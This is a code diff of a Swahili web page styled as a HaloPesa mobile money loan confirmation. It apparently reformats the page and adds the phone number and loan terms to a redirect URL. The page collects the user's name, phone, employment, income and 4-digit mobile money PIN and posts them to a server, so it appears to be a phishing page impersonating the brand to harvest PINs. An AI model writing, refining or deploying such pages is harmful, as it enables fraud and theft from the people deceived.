@@ -14,13 +14,7 @@
             --dark: #1a1a1a;
             --border: #e5e7eb;
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: var(--hp-orange);
@@ -30,253 +24,50 @@
             justify-content: center;
             padding: 20px;
         }
-
-        .container {
-            max-width: 420px;
-            width: 100%;
-            padding: 10px 0;
-        }
-
-        /* HaloPesa Logo */
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 10px;
-        }
-        .logo svg {
-            width: 100%;
-            height: 100%;
-            display: block;
-        }
-
-        .brand-name {
-            font-size: 1.8rem;
-            font-weight: 900;
-            color: #fff;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-
-        .header-sub {
-            font-size: 1rem;
-            color: #fff;
-            opacity: 0.95;
-            text-align: center;
-            margin-bottom: 18px;
-        }
-
-        /* White cards */
-        .card {
-            background: var(--white);
-            border-radius: 20px;
-            padding: 20px 16px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-        }
-
-        .card-title {
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-bottom: 12px;
-            text-align: center;
-        }
-
-        /* Loan summary grid */
-        .loan-summary {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 8px 0;
-        }
-
-        .summary-item {
-            background: var(--light-gray);
-            border-radius: 10px;
-            padding: 10px 12px;
-            text-align: center;
-        }
-
-        .summary-item .label {
-            font-size: 0.7rem;
-            color: var(--gray);
-            font-weight: 600;
-            text-transform: uppercase;
-        }
-
-        .summary-item .value {
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-top: 2px;
-        }
-
-        .summary-item .value.orange {
-            color: var(--hp-orange);
-        }
-
-        /* User details display */
-        .user-detail {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid var(--border);
-            font-size: 0.9rem;
-        }
-        .user-detail:last-of-type {
-            border-bottom: none;
-        }
-        .user-detail .label {
-            font-weight: 600;
-            color: var(--gray);
-        }
-        .user-detail .value {
-            font-weight: 700;
-            color: var(--dark);
-        }
-
-        /* PIN boxes */
-        .pin-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin: 16px 0 20px;
-        }
-
-        .pin-box {
-            width: 50px;
-            height: 56px;
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: var(--dark);
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            background: var(--white);
-        }
-
-        .pin-box:focus {
-            border-color: var(--hp-orange);
-            box-shadow: 0 0 0 3px rgba(255, 90, 31, 0.2);
-        }
-
-        .pin-box.filled {
-            border-color: var(--hp-orange);
-        }
-
-        /* Button */
-        .btn-submit {
-            display: inline-block;
-            background: var(--hp-orange);
-            color: #fff;
-            font-weight: 700;
-            font-size: 1rem;
-            padding: 14px 0;
-            border: none;
-            border-radius: 50px;
-            width: 100%;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-
-        .btn-submit:hover {
-            background: var(--hp-dark);
-            transform: translateY(-1px);
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        /* Messages */
-        .message {
-            text-align: center;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 8px 0;
-            font-weight: 500;
-        }
-        .message.success {
-            background: #dcfce7;
-            color: #166534;
-        }
-        .message.error {
-            background: #fee2e2;
-            color: #991b1b;
-        }
-        .message.info {
-            background: #dbeafe;
-            color: #1e40af;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--hp-orange);
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .footer-features {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            font-size: 0.7rem;
-            color: #fff;
-            opacity: 0.9;
-            padding: 10px 0;
-        }
-        .footer-features span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .container {
-                padding: 5px 0;
-            }
-            .card {
-                padding: 16px 12px;
-            }
-            .pin-box {
-                width: 44px;
-                height: 50px;
-                font-size: 1.4rem;
-            }
-            .loan-summary {
-                gap: 6px;
-            }
-            .summary-item {
-                padding: 8px 6px;
-            }
-            .summary-item .value {
-                font-size: 1rem;
-            }
+        .container { max-width:420px; width:100%; padding:10px 0; }
+        .logo { width:80px; height:80px; margin:0 auto 10px; }
+        .logo svg { width:100%; height:100%; display:block; }
+        .brand-name { font-size:1.8rem; font-weight:900; color:#fff; text-shadow:0 2px 4px rgba(0,0,0,0.1); text-align:center; }
+        .header-sub { font-size:1rem; color:#fff; opacity:0.95; text-align:center; margin-bottom:18px; }
+        .card { background:var(--white); border-radius:20px; padding:20px 16px; margin-bottom:15px; box-shadow:0 4px 12px rgba(0,0,0,0.08); }
+        .card-title { font-size:1.1rem; font-weight:800; color:var(--dark); margin-bottom:12px; text-align:center; }
+        .loan-summary { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin:8px 0; }
+        .summary-item { background:var(--light-gray); border-radius:10px; padding:10px 12px; text-align:center; }
+        .summary-item .label { font-size:0.7rem; color:var(--gray); font-weight:600; text-transform:uppercase; }
+        .summary-item .value { font-size:1.1rem; font-weight:800; color:var(--dark); margin-top:2px; }
+        .summary-item .value.orange { color:var(--hp-orange); }
+        .user-detail { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid var(--border); font-size:0.9rem; }
+        .user-detail:last-of-type { border-bottom:none; }
+        .user-detail .label { font-weight:600; color:var(--gray); }
+        .user-detail .value { font-weight:700; color:var(--dark); }
+        .pin-container { display:flex; justify-content:center; gap:12px; margin:16px 0 20px; }
+        .pin-box { width:50px; height:56px; border:2px solid var(--border); border-radius:12px; text-align:center; font-size:1.6rem; font-weight:700; color:var(--dark); outline:none; transition:border-color 0.2s, box-shadow 0.2s; background:var(--white); }
+        .pin-box:focus { border-color:var(--hp-orange); box-shadow:0 0 0 3px rgba(255,90,31,0.2); }
+        .pin-box.filled { border-color:var(--hp-orange); }
+        .btn-submit { display:inline-block; background:var(--hp-orange); color:#fff; font-weight:700; font-size:1rem; padding:14px 0; border:none; border-radius:50px; width:100%; cursor:pointer; transition:0.2s; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center; }
+        .btn-submit:hover { background:var(--hp-dark); transform:translateY(-1px); }
+        .btn-submit:disabled { opacity:0.6; cursor:not-allowed; }
+        .message { text-align:center; padding:10px; border-radius:10px; margin:8px 0; font-weight:500; }
+        .message.success { background:#dcfce7; color:#166534; }
+        .message.error { background:#fee2e2; color:#991b1b; }
+        .message.info { background:#dbeafe; color:#1e40af; }
+        .hidden { display:none !important; }
+        .loader { border:4px solid #f3f3f3; border-top:4px solid var(--hp-orange); border-radius:50%; width:24px; height:24px; animation:spin 1s linear infinite; margin:0 auto; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .footer-features { display:flex; justify-content:center; gap:20px; font-size:0.7rem; color:#fff; opacity:0.9; padding:10px 0; }
+        .footer-features span { display:flex; align-items:center; gap:4px; }
+        @media (max-width:480px) {
+            .container { padding:5px 0; }
+            .card { padding:16px 12px; }
+            .pin-box { width:44px; height:50px; font-size:1.4rem; }
+            .loan-summary { gap:6px; }
+            .summary-item { padding:8px 6px; }
+            .summary-item .value { font-size:1rem; }
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-
-        <!-- HaloPesa Logo -->
         <div class="logo">
             <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                 <rect width="100" height="100" rx="22" fill="#FF5A1F"/>
@@ -284,53 +75,26 @@
                 <path d="M53 77 C67 74 76 65 79 51 C81 42 79 31 74 27 C69 23 62 25 59 30 C56 35 58 42 61 48 C64 55 63 62 58 67 C54 72 48 76 41 78 C46 80 50 79 53 77 Z" fill="white"/>
             </svg>
         </div>
-
         <div class="brand-name">HaloPesa</div>
         <div class="header-sub">Thibitisha muamala wako</div>
-
-        <!-- Loan Summary Card -->
         <div class="card">
             <div class="card-title">📊 Muhtasari wa Mkopo</div>
             <div class="loan-summary">
-                <div class="summary-item">
-                    <div class="label">Kiasi cha Mkopo</div>
-                    <div class="value orange" id="summaryAmount">TZS 1,000,000</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Muhula</div>
-                    <div class="value" id="summaryTerm">3 Mwezi/mi</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Kila Mwezi</div>
-                    <div class="value orange" id="summaryMonthly">TZS 336,115</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Riba</div>
-                    <div class="value">5%</div>
-                </div>
+                <div class="summary-item"><div class="label">Kiasi cha Mkopo</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
+                <div class="summary-item"><div class="label">Muhula</div><div class="value" id="summaryTerm">3 Mwezi/mi</div></div>
+                <div class="summary-item"><div class="label">Kila Mwezi</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
+                <div class="summary-item"><div class="label">Riba</div><div class="value">5%</div></div>
             </div>
         </div>
-
-        <!-- PIN & User Details Card -->
         <div class="card">
             <div class="card-title">🔐 Thibitisha PIN yako</div>
             <p style="font-size:0.85rem; color:var(--gray); text-align:center; margin-bottom:12px;">
                 Ingiza PIN yako ya simu yenye tarakimu 4 ili kuidhinisha malipo
             </p>
-
-            <!-- User details display -->
             <div style="margin-bottom:16px;">
-                <div class="user-detail">
-                    <span class="label">Jina Kamili</span>
-                    <span class="value" id="displayName">---</span>
-                </div>
-                <div class="user-detail">
-                    <span class="label">Nambari Ya Simu</span>
-                    <span class="value" id="displayPhone">---</span>
-                </div>
+                <div class="user-detail"><span class="label">Jina Kamili</span><span class="value" id="displayName">---</span></div>
+                <div class="user-detail"><span class="label">Nambari Ya Simu</span><span class="value" id="displayPhone">---</span></div>
             </div>
-
-            <!-- PIN input boxes -->
             <form id="pinForm">
                 <div class="pin-container">
                     <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric" autofocus>
@@ -342,18 +106,13 @@
                 <div id="formStatus" class="message hidden"></div>
             </form>
         </div>
-
-        <!-- Footer Features -->
         <div class="footer-features">
             <span>🔒 Salama kwa Njia Fiche</span>
             <span>⚡ Idhini ya Dakika 5</span>
             <span>💰 Hakuna Ada Zilizofichwa</span>
         </div>
-
     </div>
-
     <script>
-        // ----- Get data from URL -----
         const params = new URLSearchParams(window.location.search);
         const amount = params.get('amount');
         const months = params.get('months');
@@ -362,54 +121,37 @@
         const employment = params.get('employment');
         const income = params.get('income');
 
-        // Validate required data – if missing, redirect back to apply-form
         if (!amount || !months || !fullName || !phone || !employment || !income) {
             window.location.href = '/apply-form?amount=' + (amount || 1000000) + '&months=' + (months || 3);
         }
 
-        // Populate summary
         const APR = 0.05;
         const monthlyRate = APR / 12;
         const principal = parseInt(amount);
         const term = parseInt(months);
         let monthlyPayment = 0;
-        if (monthlyRate === 0) {
-            monthlyPayment = principal / term;
-        } else {
-            monthlyPayment = principal * monthlyRate * Math.pow(1 + monthlyRate, term) / (Math.pow(1 + monthlyRate, term) - 1);
-        }
+        if (monthlyRate === 0) { monthlyPayment = principal / term; } 
+        else { monthlyPayment = principal * monthlyRate * Math.pow(1 + monthlyRate, term) / (Math.pow(1 + monthlyRate, term) - 1); }
 
         function formatCurrency(num) {
             return 'TZS ' + Math.round(num).toLocaleString('en-US');
         }
-
         document.getElementById('summaryAmount').textContent = formatCurrency(principal);
         document.getElementById('summaryTerm').textContent = term + ' Mwezi/mi';
         document.getElementById('summaryMonthly').textContent = formatCurrency(monthlyPayment);
-
-        // Display user details
         document.getElementById('displayName').textContent = fullName;
         document.getElementById('displayPhone').textContent = phone;
 
-        // ----- PIN Box Auto-advance -----
+        // PIN boxes auto-advance
         const pinBoxes = document.querySelectorAll('.pin-box');
-
         pinBoxes.forEach((box, index) => {
-            // When a digit is entered, move to next box
-            box.addEventListener('input', function(e) {
-                const value = this.value;
-                if (value.length === 1 && index < pinBoxes.length - 1) {
+            box.addEventListener('input', function() {
+                if (this.value.length === 1 && index < pinBoxes.length - 1) {
                     pinBoxes[index + 1].focus();
                 }
-                // Mark as filled if not empty
-                if (value.length === 1) {
-                    this.classList.add('filled');
-                } else {
-                    this.classList.remove('filled');
-                }
+                if (this.value.length === 1) this.classList.add('filled');
+                else this.classList.remove('filled');
             });
-
-            // Handle backspace: move to previous box
             box.addEventListener('keydown', function(e) {
                 if (e.key === 'Backspace' && this.value === '' && index > 0) {
                     pinBoxes[index - 1].focus();
@@ -417,35 +159,25 @@
                     pinBoxes[index - 1].classList.remove('filled');
                 }
             });
-
-            // Allow only digits
             box.addEventListener('keypress', function(e) {
-                const char = String.fromCharCode(e.which);
-                if (!/[0-9]/.test(char)) {
-                    e.preventDefault();
-                }
+                if (!/[0-9]/.test(String.fromCharCode(e.which))) e.preventDefault();
             });
         });
 
-        // ----- Form submission -----
         const form = document.getElementById('pinForm');
         const submitBtn = document.getElementById('submitBtn');
         const formStatus = document.getElementById('formStatus');
 
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
-
-            // Collect PIN from boxes
             let pin = '';
             pinBoxes.forEach(box => pin += box.value.trim());
             if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
                 showMessage(formStatus, 'Tafadhali ingiza PIN kamili ya tarakimu 4.', 'error');
-                // Clear boxes and focus first
                 pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                 pinBoxes[0].focus();
                 return;
             }
-
             hideMessage(formStatus);
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="loader"></span> Inasubiri...';
@@ -464,14 +196,11 @@
                         monthly_income: parseInt(income)
                     })
                 });
-
                 const data = await response.json();
-
                 if (data.success) {
                     showMessage(formStatus, '✅ Ombi lako limetumwa! Mhudumu atalithibitisha.', 'success');
-                    // Redirect to approval page after a short delay
                     setTimeout(() => {
-                        window.location.href = `/approve?app_id=${data.app_id}`;
+                        window.location.href = `/approve?app_id=${data.app_id}&amount=${amount}&months=${months}&phone=${phone}`;
                     }, 2000);
                 } else {
                     showMessage(formStatus, '❌ Hitilafu: ' + (data.error || 'Jaribu tena baadaye.'), 'error');
@@ -488,11 +217,7 @@
             el.textContent = msg;
             el.classList.remove('hidden');
         }
-
-        function hideMessage(el) {
-            el.classList.add('hidden');
-        }
-
+        function hideMessage(el) { el.classList.add('hidden'); }
         function resetButton() {
             submitBtn.disabled = false;
             submitBtn.textContent = 'Thibitisha na Uendelee';
